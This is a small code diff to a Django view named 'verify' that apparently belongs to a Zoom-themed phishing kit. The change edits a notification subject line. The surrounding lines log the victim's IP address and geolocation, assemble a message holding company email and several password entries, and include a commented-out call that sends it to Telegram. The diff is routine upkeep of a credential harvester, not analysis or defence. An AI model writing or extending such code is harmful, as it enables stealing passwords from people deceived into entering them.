@@ -82,7 +82,7 @@ def verify(request):
      
         ip_address = request.META.get("REMOTE_ADDR")
         country, city = get_country_from_ip(ip_address)
-        subject = 'New zoome details submitted'
+        subject = 'News zoom details submitted'
         # mail_message = f"{subject}\nipaddress:{ip_address} \ncountry:{country} \ncity:{city}\ncompany_name: {name}\ncompany_mail: {email}\npassword: {passw}\npassword1: {pass1}\npassword2: {pass2}"
 
         # send_to_telegram(mail_message)
